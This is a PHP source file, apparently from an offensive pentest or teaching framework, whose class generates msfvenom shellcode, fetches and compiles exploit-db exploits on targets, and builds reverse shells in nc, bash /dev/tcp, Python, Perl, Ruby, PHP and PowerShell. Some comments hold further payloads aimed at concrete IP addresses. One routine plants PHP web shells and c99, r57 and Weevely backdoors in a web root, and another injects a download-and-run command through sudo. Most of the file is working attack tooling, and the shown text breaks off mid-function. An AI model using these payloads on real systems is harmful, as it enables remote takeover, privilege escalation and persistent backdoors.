<?php

class com4malw extends com4obj {
    var $badchars ;
    // Listen : socat TCP-LISTEN:2337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
    // connect : socat FILE:`tty`,raw,echo=0 TCP:192.168.56.102:2337
    
    function __construct(){
        // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
        parent::__construct();
        $this->badchars = array('20','00','0a');
    }

    
    function msf2shellcode4linux($cmd) {
       $this->ssTitre(__FUNCTION__);
       $hash = sha1($cmd);
        $this->requette( "msfvenom --payload linux/x86/exec cmd=\"$cmd\" --arch x86 --platform linux --bad-chars \"\\x00\\x20\\x0a\" --format c > $this->file_dir/$this->file_name"."_$hash.h "); // --encoder x86/shikata_ga_nai --iterations 1 PrependSetreuid=true PrependSetregid=true AppendExit=true PrependChrootBreak=true
        $check = file_get_contents("$this->file_dir/$this->file_name"."_$hash.h");
        if (empty($check )) {
            $this->important( "Echec msfvenom Retry in 3 secondes");
            sleep(3 );
            $this->file_msf2root($cmd );
        }
        $file_h = new file("$this->file_dir/$this->file_name"."_$hash.h");
        $hex = $file_h->file_h2hex();
        $flag = $this->payload2check4norme($hex,$this->badchars);
        if ($flag == false) {
            $this->important("Echec Obstacle");
            $this->file_msf2root($cmd);
        }
        return $hex;
    }
    
    public function exploitdb2file4exec($ip, $port,$user2name, $user2pass,$files_list){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        if(!empty($files_list)){
            foreach ($files_list as $file){
                $file = trim($file);
                if(!empty($file)){
                    $obj_file = new FILE($file);
                    $obj_file->file_file2info();
                    $port_rev = $this->port_rfi+1;
                    $this->article("EXTENSION",$obj_file->file_ext);
                    switch ($obj_file->file_ext) {
                        case ($obj_file->file_ext=="c") :
                            $option_compile = $obj_file->req_ret_str("grep -i 'gcc' $obj_file->file_path  | grep -Po -i \"gcc *\" ");
                            //$this->requette("gedit $obj_file->file_path");
                            $this->article("OPT GCC",$option_compile);
                            $this->requette("cp -v $obj_file->file_path $this->dir_tmp/$obj_file->file_name$obj_file->file_ext ");
                            
                            $command = "wget http://".$this->ip4addr4target($this->ip).":$port_rev/$obj_file->file_name$obj_file->file_ext -O  ./$obj_file->file_name$obj_file->file_ext  && gcc -ggdb -w -std=c99 $option_compile ./$obj_file->file_name$obj_file->file_ext -o ./$obj_file->file_name.elf && chmod +x ./$obj_file->file_name.elf && echo 'id && exit' | ./$obj_file->file_name.elf | tee ./$obj_file->file_name.rst && cat ./$obj_file->file_name.rst && rm -v ./$obj_file->file_name.* ";
                            //$result .= $this->ssh($ip, $port,$user2name, $user2pass,$command);
                            break;
                            
                    }
                }
            }
        }
        return $result;
    }
    

    
    // ############################ EXPLOIT DB #########################################
    function exploitdb($soft) {
        $this->ssTitre(__FUNCTION__);
        $rst = array();
        /*
         searchsploit kernel 2.6 Escalation
         searchsploit linux kernel 3.9 --exclude="/dos/"
         */
        $soft = trim($soft);
        //$this->requette("perl $this->dir_tools/root/Linux_Exploit_Suggester.pl -k $soft"); 
        $hash = sha1($soft);
        $file_rst = "$this->dir_tmp/$hash.exploitdb.rst";

        $query = "searchsploit --colour \"$soft\" 2>/dev/null | grep -v \"/dos/\" | grep -Po \"exploits/[[:print:]]{1,}$\"  | sed \"s#exploits/#/opt/exploitdb/exploits/#g\" | tee $file_rst";       
        if (file_exists($file_rst)) {$this->requette("cat $file_rst");return file($file_rst);}
        if (!empty($soft)) return $this->req_ret_tab( $query );
        else return $rst;
    }
    // #################################################################################
    
    
    
    public function exploit2file2compile($stream,$options_compiler,$file_exploit){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $file_exploit = trim($file_exploit);
        
        
        
        if(!empty($file_exploit)){
            
            $obj_file = new FILE($file_exploit);
            
            $obj_file->file_file2info();
            $this->article("EXTENSION",$obj_file->file_ext);
            $this->requette("cp -v $obj_file->file_path $this->dir_tmp/$obj_file->file_name$obj_file->file_ext ");
            
            if (is_resource($stream)){
                $ip_attacker = $this->ip4addr4target($this->ip);
                //$this->requette("gedit $obj_file->file_path");
                if($this->tcp2open($ip_attacker, $this->port_rfi)){
                    $data = "wget http://$ip_attacker:$this->port_rfi/$obj_file->file_name$obj_file->file_ext -O  /tmp/$obj_file->file_name$obj_file->file_ext "; //
                    $this->lan2stream4result($data,$this->stream_timeout);
                }
            }
            

            
            switch ($obj_file->file_ext) {
                case ($obj_file->file_ext==".c") :
                    $option_compile = trim($obj_file->req_ret_str("grep -i -E \"(gcc |cc |clang )\" $obj_file->file_path | grep -Po \"(gcc |cc |clang )[[:print:]]{1,}\" "));
                    $this->article("OPT GCC",$option_compile);
                    $data = "gcc -ggdb -w $options_compiler /tmp/$obj_file->file_name$obj_file->file_ext -o /tmp/$obj_file->file_name.elf && chmod +x /tmp/$obj_file->file_name.elf"; //
                    $this->req_str($stream,$data,10);
                    
                    $data = "ls -al /tmp/$obj_file->file_name.elf"; //
                    $this->lan2stream4result($data,$this->stream_timeout);
                    $data = "file /tmp/$obj_file->file_name.elf "; //
                    $this->lan2stream4result($data,$this->stream_timeout);
                    return "/tmp/$obj_file->file_name.elf" ;
                    
                case ($obj_file->file_ext==".py") :
                    return "python /tmp/$obj_file->file_name$obj_file->file_ext" ;
                case ($obj_file->file_ext==".pl") :
                    return "perl /tmp/$obj_file->file_name$obj_file->file_ext" ;
                case ($obj_file->file_ext==".sh") :
                    return "sh /tmp/$obj_file->file_name$obj_file->file_ext" ;
                case ($obj_file->file_ext==".php") :
                    return "php /tmp/$obj_file->file_name$obj_file->file_ext" ;
                case ($obj_file->file_ext==".rb") :
                    $query = "cat $obj_file->file_path | grep \"Name\" | cut -d '>' -f2 | cut -d',' -f1";
                    $search_msf = $this->req_ret_str($query);
                    if(!empty($search_msf)) echo $obj_file->msf2search2info($search_msf);
                    return "ruby /tmp/$obj_file->file_name$obj_file->file_ext" ;

                case ($obj_file->file_ext=="") :
                    return "/tmp/$obj_file->file_name$obj_file->file_ext" ;
                default:
                    return "/tmp/$obj_file->file_name$obj_file->file_ext" ;
            }
            
            
            
            
        }
        
    }
    
    public function rev8nc($attacker_ip,$attacker_port,$shell){
        $data = "nc $attacker_ip $attacker_port -e /bin/sh"; // 0>&1
        $this->article(__FUNCTION__, $data);
        return $data ;
    }
    
    public function rev8ncat($attacker_ip,$attacker_port,$shell){
        $data = "ncat $attacker_ip $attacker_port -e /bin/sh"; // 0>&1
        $this->article(__FUNCTION__, $data);
        return $data ;
    }
    
    public function rev8python3($attacker_ip,$attacker_port,$shell){
        $data = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attacker_ip\",$attacker_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$shell\",\"-i\"]);' "; // OK
        $this->article(__FUNCTION__, $data);
        return $data ;
    }
    
    public function rev8python($attacker_ip,$attacker_port,$shell){
        /*
        
        ╔PYTHON═════════════════════════════════════════════
        ║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("171.25.193.25",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("$shell")'
        
        ╔═══════════════════════════════════════════════════
        ║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("171.25.193.25",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'
        
        ╔═══════════════════════════════════════════════════
        ║ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('171.25.193.25', 1234)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\windows\system32\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
        
        ════════════════════════════════════════════════════
        
        
        */
        // echo '__import__("os").system("id")' | python
        $data = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attacker_ip\",$attacker_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$shell\",\"-i\"]);' "; // OK 
        //$data = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attacker_ip\",$attacker_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"$shell\")' ";
        $this->article(__FUNCTION__, $data);
        return $data ;
    }
    public function rev8sh($attacker_ip,$attacker_port,$shell){
        $data = "$shell -i >& /dev/tcp/$attacker_ip/$attacker_port 0<&1 2>&1"; // 0<&1 2>&1 // 0>&1 
        $this->article(__FUNCTION__, $data);
        return $data ;
    }
    public function rev8perl($attacker_ip,$attacker_port,$shell){
         /*
         
         $this->requette("echo 'use Socket;\$i=\"$attacker_ip\";\$p=$attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"cmd.exe\");};' > $this->file_dir/rev8perl4win.pl" );
         
         $this->cmd("WIN","msfvenom --payload  cmd/windows/reverse_perl LHOST='$attacker_ip' LPORT=$this->port R ;echo " );
         $this->cmd("", "perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$attacker_ip:$attacker_port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'" );
         $this->cmd($this->prof, " " );
         */
        //$this->requette("echo 'use IO::Socket;\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$attacker_ip:$attacker_port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;' > $this->file_path" );
        
        $this->article("Spawn shell using Perl one-liner", "At the time of privilege, escalation phase executes below command to view sudo user list.
sudo -l
Now you can observe the text is showing that the usertest can run Perl language program or script as root user. (/usr/bin/perl) Therefore we got root access by executing Perl one-liner.
perl -e 'exec \"$shell\";'");
        // 
        $rev8sh = $this->rev8sh($attacker_ip, $attacker_port, $shell);
        $this->cmd("CMD", "nc -l -p $attacker_port -v " );
        $perl_source_code = "use Socket;\\\$i=\"$attacker_ip\";\\\$p=$attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\\\$p,inet_aton(\\\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$shell -i\");};";
        $data = "perl -e '$perl_source_code'";
        
        
        $this->cmd("CMD","perl -e \"system '$rev8sh'\"" );
        //$data = "perl -e \"exec '$rev8sh'\"";
        $this->article(__FUNCTION__, $data);
        return $data ;
    }
    public function rev8ruby($attacker_ip,$attacker_port,$shell){
        $rev8sh = $this->rev8sh($attacker_ip, $attacker_port, $shell);
        $this->cmd("CMD","ruby -e \"exec '$rev8sh'\"" );
        $this->cmd("CMD","ruby -e \"system '$rev8sh'\"" );
        $data =  "ruby -rsocket -e'f=TCPSocket.open(\"$attacker_ip\",$attacker_port).to_i;exec sprintf(\"$shell -i <&%d >&%d 2>&%d\",f,f,f)'" ;
        $data =  "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$attacker_ip\",\"$attacker_port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" ;
        $this->article(__FUNCTION__, $data);
        return $data ;
    }


    
    public function rev8exec($attacker_ip,$attacker_port,$shell){
        $data = "0<&196;exec 196<>/dev/tcp/$attacker_ip/$attacker_port; sh <&196 >&196 2>&196 ";
        $this->article(__FUNCTION__, $data);
        return $data ;
    }
    public function rev8fifo($attacker_ip,$attacker_port,$shell){
        // .exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc 192.168.56.102 4444 >/tmp/f
        $sha1_hash = sha1("$attacker_ip:$attacker_port;$shell");
        $file = tmpfile();
        $file_tmp = stream_get_meta_data($file)['uri'];
        $data = "mkfifo $file_tmp && nc $attacker_ip $attacker_port 0<$file_tmp | $shell -i >$file_tmp 2>&1 && rm $file_tmp";
        //$data = "rm /tmp/$sha1_hash;mkfifo /tmp/$sha1_hash;cat /tmp/$sha1_hash | $shell -p -i 2>&1 | nc $attacker_ip $attacker_port > /tmp/$sha1_hash";
        $this->article(__FUNCTION__, $data);
        return $data ;
    }
    public function rev8powershell($attacker_ip,$attacker_port,$shell){
        /*
        
        ╔POWERSHELL═════════════════════════════════════════
        ║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("171.25.193.25",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        
        ╔═══════════════════════════════════════════════════
        ║ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('171.25.193.25',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        
        ════════════════════════════════════════════════════
        
        */
        // Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://YourIPAddress:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"
        /*
         C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe wget "http://<attacker_ip>/<file>" -outfile "<output_file_name>"
         powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>/<file>', '<output_file_name>')"
         powershell -command "Invoke-WebRequest 'http://<attacker_ip>/<file>' -OutFile '<output_file_name>'"
         
         powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.101',8099);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
         
         */
        $data = "";
        return $data ;
    }
    
   
    
    
 
    
 
    
    
    public function rev8pinfo($attacker_ip,$attacker_port,$shell){
        /*
         pinfo hit \u201c!\u201d (exclamation mark). Notice that this opened a command execution feature, now let\u2019s execute some simple commands, such as the previous \u201cls /etc\u201d
         */
        
        
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $data = "";
        $result .= $this->lan2stream4result($data);
        return trim($result);
    }
    
    

    
 
    
    
    public function rev8telnet($attacker_ip,$attacker_port,$shell){
        /*
         Telnet Reverse Shell
         rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
         telnet ATTACKING-IP 80 | $shell | telnet ATTACKING-IP 443
         */
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $data = "";
        $result .= $this->lan2stream4result($data);
        return trim($result);
    }
    
    public function rev8convert($ip_attacker, $rport,$app,$shell){
        $this->ssTitre(__FUNCTION__);
        $file = "/tmp/rev8sh_$ip_attacker.$rport.sh";
        $obj_file = new FILE($file);
        $obj_file->rev8sh($ip_attacker, $rport);
        $rev = "wget http://$ip_attacker:$this->port_rfi/$obj_file->file_name$obj_file->file_ext -O /tmp/$obj_file->file_name$obj_file->file_ext && chmod +x /tmp/$obj_file->file_name$obj_file->file_ext && $shell /tmp/$obj_file->file_name$obj_file->file_ext"; //
        $data = "echo '$this->root_passwd' | sudo -S $app 'https://127.0.0.1\"| $rev\"' /tmp/out.png 2> /dev/null";
        $this->lan2root4check2server($rport,"root8sudoers=".__FUNCTION__."=sudo -l $this->uid_name:$this->uid_pass@sudo $app", $data,600);
    }
    
 
  
    
    public function rev8oracle($attacker_ip,$attacker_port,$shell){
        /*
         Oracle iSQL* Plus
         
         exec dbms_java.grant_permission( 'SYSTEM','SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
         
         begin
         dbms_java.grant_permission
         ('SYSTEM',
         'java.io.FilePermission',
         '<<ALL FILES>>',
         'execute');
         dbms_java.grant_permission
         ('SYSTEM',
         'java.lang.RuntimePermission',
         '*',
         'writeFileDescriptor' );
         end;
         
         exec javacmd('<command>');
         
         
         */
    }
    
    public function rev8mssql($attacker_ip,$attacker_port,$shell){
        /*
         MS SQL
         
         EXEC SP_CONFIGURE N'show advanced options', 1
         go
         EXEC SP_CONFIGURE N'xp_cmdshell', 1
         go
         RECONFIGURE
         go
         xp_cmdshell 'cd C:\<path_to_bind_shell>\ & <bind_shell_name>.exe';
         go
         */
    }
    
    public function rev8python2($attacker_ip,$attacker_port,$shell){
        /*
         python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'
         
         python -c 'import pty; pty.spawn("$shell")'
         python3 -c 'import pty; pty.spawn("$shell")'
         python: exit_code = os.system('$shell') output = os.popen('$shell').read()
         python -c 'import pty; pty.spawn("$shell")'
         2) From python > python -c 'import os; os.system("$shell")'
         python -c 'import
         socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
         EAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
         os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'
         
         TCP:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'
         UDP:import os,pty,socket;s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("10.10.14.17", 4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE",'/dev/null');pty.spawn("$shell");s.close()
         
         (sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"
         
         */
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $this->article("Spawn shell using Python one-liner","requires that the user can run the python language or script as root user. (/usr/bin/python) this can be determined by running
sudo -l
thus we can aquire root access by executing the python one-liner
python -c 'import pty;pty.spawn(\"$shell\")' ");
        $data = "";
        $result .= $this->lan2stream4result($data);
        return trim($result);
    }
    
 
    

  
    
    public function rev8pico($attacker_ip,$attacker_port,$shell){
        
        // 6)From pico > pico -s "$shell" then you can write $shell and then CTRL + T
        // pico -s "$shell"\u8fdb\u5165\u7f16\u8f91\u5668\u5199\u5165$shell \u7136\u540e\u6309 ctrl + T \u952e
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $data = "";
        $result .= $this->lan2stream4result($data);
        return trim($result);
    }
    
    
   
    
    public function rev8lynx($attacker_ip,$attacker_port,$shell){
        /*
         Lynx
         
         Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx “guest accounts” and other public services. More details LynxShell
         
         When you start up a lynx client session, you can hit “g” (for goto) and then enter the following URL:
         
         URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;$shell;/SugFile=/dev/null
         “links”, “lynx” and “elinks
         
         */
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $data = "";
        $result .= $this->lan2stream4result($data);
        return trim($result);
    }

    
    public function rev8nodejs($attacker_ip,$attacker_port,$shell){
        /*
        
        ╔NODEJS═════════════════════════════════════════════
        ║(function(){
        var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("$shell", []);
        var client = new net.Socket();
        client.connect(1234, "171.25.193.25", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
        })();
        
        ╔═════╦═════════════════════════════════════════════
        ║ OR  ║ require('child_process').exec('nc -e $shell 171.25.193.25 1234')
        ╚═════╩═════════════════════════════════════════════
        ╔═════╦═════════════════════════════════════════════
        ║ OR  ║ -var x = global.process.mainModule.require
        -x('child_process').exec('nc 171.25.193.25 1234 -e $shell')
        
        ════════════════════════════════════════════════════
        
        */
        $data = "";
        return $data ;
    }
    
    public function rev8node($attacker_ip,$attacker_port,$shell){
        $file = tmpfile();
        $file_tmp = stream_get_meta_data($file)['uri'];
        $data = "mknod $file_tmp p; nc $attacker_ip $attacker_port 0<$file_tmp | $shell 1>$file_tmp ";
        
        //$data = "mknod /tmp/tmp_pipe p; /dev/tcp/$attacker_ip/$attacker_port 0</tmp/tmp_pipe | $shell 1>/tmp/tmp_pipe";
        return $data ;
    }
    public function rev8java($attacker_ip,$attacker_port,$shell){
        /*
         ╔JAWA═══════════════════════════════════════════════
         ║ r = Runtime.getRuntime()
         p = r.exec(["$shell","-c","exec 5<>/dev/tcp/171.25.193.25/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
         p.waitFor()
         
         ════════════════════════════════════════════════════
         ╔JAWA For GROOVY════════════════════════════════════
         ║ String host="171.25.193.25";
         int port=1234;
         String cmd="cmd.exe";
         Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
         
         ════════════════════════════════════════════════════
         */
        /*
         r = Runtime.getRuntime(); p = r.exec(["$shell","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
         
         */
        $data = "";
        return $data ;
    }
    public function rev8ocaml($attacker_ip,$attacker_port,$shell){
        $data = "";
        return $data ;
    }
    public function rev8go($attacker_ip,$attacker_port,$shell){
        /*
               
         $ go run Go/shell.go
         
         package main
         
         import (
         "fmt"
         "log"
         "os"
         "os/exec"
         )
         
         func main() {
         shell := exec.Command("$shell")
         shell.Stdout = os.Stdout
         shell.Stdin = os.Stdin
         shell.Stderr = os.Stderr
         err := shell.Run()
         if err != nil {
         log.Fatalf("command failed: %v", err)
         }
         fmt.Printf("exiting\n")
         }
         
         */
        $data = "";
        return $data ;
    }
    
    public function rev2test($attacker_ip,$attacker_port,$shell){
        $this->titre(__FUNCTION__);
        $this->rev8exec($attacker_ip,$attacker_port,$shell); // OK 
        $this->rev8fifo($attacker_ip,$attacker_port,$shell); // OK 
        $this->rev8perl($attacker_ip,$attacker_port,$shell); // OK  
        //$this->rev8php($attacker_ip,$attacker_port,$shell); // No 
        $this->rev8python($attacker_ip,$attacker_port,$shell); // OK 
        //$this->rev8ruby($attacker_ip,$attacker_port,$shell); // No
        $this->rev8sh($attacker_ip,$attacker_port,$shell); // OK 
    }
    
    
    public function rev8php($attacker_ip,$attacker_port,$shell){
        $data = "php -r 'exec(\"".$this->rev8sh($attacker_ip, $attacker_port, $shell)."\");' ";
        $data = "php -r \"exec('".$this->rev8fifo($attacker_ip, $attacker_port, $shell)."');\" ";
        $data = "php -r \"system('".$this->rev8fifo($attacker_ip, $attacker_port, $shell)."');\" ";
        //$data = "php -r \"\$sock=fsockopen('$attacker_ip',$attacker_port);exec('$shell');\" ";
        $this->article(__FUNCTION__, $data);
        return $data ;
    }
    
    public function rev8php2poc() {
        $this->ssTitre("PHP" );
        $this->requette("php -r \"system('sh');\" " );
        $this->ssTitre("Backdoor PHP" );
        $this->requette("echo '<?php system(\"sh\")?>' > $this->file_dir/sh.php" );
        
        $cmd2 = "php -r '\$sock=fsockopen(\"127.0.0.1\",8181);exec(\"$shell -i <&3 >&3 2>&3\");' ";
        //$this->exec_parallel($cmd3, $cmd2, 1 );
        $this->pause();
        
        $this->requette("gedit $this->file_dir/sh.php" );
        $this->requette("php $this->file_dir/sh.php" );
        $file_sh = new file("$this->file_dir/sh.php" );$file_sh->file_file2virus2vt();
        $this->pause();
        $this->rev8php_simple();$this->pause();
        $this->requette("echo \"<?php passthru(\\\$_REQUEST[\\\"cmd\\\"]);?>\" | sudo tee /var/www/html/passthru.php " );
        $this->net("localhost/passthru.php?cmd=ls" );
        $this->pause();
        $this->requette("echo \"<?php system(\\\$_REQUEST[\\\"cmd\\\"]);?>\" | sudo tee /var/www/html/system_request.php " );
        $this->net("localhost/system_request.php?cmd=ls" );
        $this->pause();
        $this->gras("firefox HTTP Live plugin\n" );
        $this->requette("echo \"<?php system(\\\$_GET[\\\"cmd\\\"]);?>\" | sudo tee /var/www/html/system_get.php " );
        $this->net("localhost/system_get.php?cmd=ls" );
        $this->pause();
        $this->gras("firefox Hack-bar (send POST) + (see) HTTP Live plugin \n" );
        $this->requette("echo \"<?php system(\\\$_POST[\\\"cmd\\\"]);?>\" | sudo tee /var/www/html/system_post.php " );
        $this->net("localhost/system_post.php?cmd=ls" );
        $this->pause();
        $this->requette("echo '$this->root_passwd' | sudo -S rm -v /var/www/html/passthru.php /var/www/html/system_*.php" );
        
        
        $this->ssTitre("Backdoor PHP with Weevely" );
        $this->net("http://epinna.github.io/Weevely/" );
        if (! file_exists("/opt/Weevely3/weevely.py" )) $this->install_malware_weevely ();
        $this->requette("cd /opt/Weevely3/; python generate.py $this->user2local '$this->file_dir/weevely_shell.php'" );
        $this->requette("echo '$this->root_passwd' | sudo -S cp -v $this->file_dir/weevely_shell.php /var/www/html/" );
        $this->pause();
        $this->requette("echo '$this->root_passwd' | sudo -S gedit /var/www/html/weevely_shell.php" );
        virustotal_scan("$this->file_dir/weevely_shell.php" );
        $this->pause();
        $this->cmd("localhost", "python /opt/Weevely3/weevely.py 'http://$this->prof/weevely_shell.php'  $this->user2local " );
        $this->pause();
        
        $this->ssTitre("Public PHP Backdoor" );
        $this->net("http://www.c99php.com/" ); // php -S 0.0.0.0:8083
        // cmd("localhost","cd $this->dir_tools/web/php_backdoor; python -m SimpleHTTPServer 8080");
        system("echo '$this->root_passwd' | sudo -S cp -v $this->dir_tools/web/php_backdoor/*.php /var/www/html" );
        $this->pause();
        $this->net("$this->host/c99.php" );
        $this->net("$this->host/Fx29SheLL.php" );
        $this->net("$this->host/gny.php" );
        $this->net("$this->host/r57.php" );
        $this->net("$this->host/storm.php" );
        $this->net("$this->host/webshell.php" );
        $this->pause();
        $this->net("https://code.google.com/p/web-malware-collection/" );
        $this->requette("nautilus $this->dir_tools/web/web-malware-collection/" );
        $this->pause();
        $this->requette("echo '$this->root_passwd' | sudo -S rm -v /var/www/html/*.php" );
        
    }
    
    public function rev8python1($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre("Python" );
        $this->requette("python -c 'import pty;pty.spawn(\"$shell\")' " );
